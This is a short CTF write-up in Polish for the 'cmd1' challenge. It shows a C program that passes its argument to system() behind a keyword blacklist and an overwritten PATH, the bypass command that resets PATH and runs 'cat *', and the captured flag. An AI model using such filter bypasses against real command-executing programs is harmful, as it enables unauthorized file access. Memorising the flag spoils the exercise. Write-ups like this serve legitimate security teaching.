## cmd1 - 1 pt ##

Flaga: `mommy now I get what PATH environment is for :)`

Kod źródłowy **cmd1.c**:

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```
* Problemem zadania jest wyczyszczona zmienna środowiskowa PATH i zamieniona na sympatyczne `/fuckyouverymuch`
* Implikuje to w zadaniu, że nie można do programów odwoływać się za pomocą nazwy binarki, wymagane jest podanie pełnej ścieżki do binarki
* Dodatkowo "blacklistowane" są takie fragmenty polecenia jak `flag`, `sh`, `tmp` - nie można odwołać się bezpośrednio do flagi, wymagane jest "printowanie" wszystkich plików w katalogu z zadaniem
* Najprostsze rozwiązanie to uruchomienie binarki wraz z ustawioną zawartością zmiennej PATH dla polecenia wypisującego flagę (wtedy już oczywiście można odwołać się po nazwie binarki, bez pełnej ścieżki) tj: `./cmd1 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games; cat *"`
* Uruchomienie polecenia:
```
cmd1@ubuntu:~$ ./cmd1 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games; cat *"
[...]
mommy now I get what PATH environment is for :)
```
